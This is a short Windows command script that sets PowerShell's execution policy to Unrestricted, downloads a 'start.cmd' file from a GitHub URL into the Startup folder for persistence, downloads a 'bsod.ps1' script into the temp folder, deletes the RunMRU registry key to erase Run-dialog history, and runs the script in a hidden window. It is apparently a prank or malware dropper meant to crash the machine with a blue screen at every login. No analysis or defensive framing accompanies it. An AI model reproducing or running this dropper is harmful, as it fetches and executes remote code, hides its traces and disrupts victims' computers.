powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup && powershell.exe iwr https://raw.githubusercontent.com/alext30Developer/rdrp/main/BSOD/files/start.cmd -outfile start.cmd
cd %temp% && powershell.exe iwr https://raw.githubusercontent.com/alext30Developer/rdrp/main/BSOD/files/bsod.ps1 -outfile bsod.ps1
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
cd %temp% && powershell.exe -WindowStyle Hidden -File .\bsod.ps1
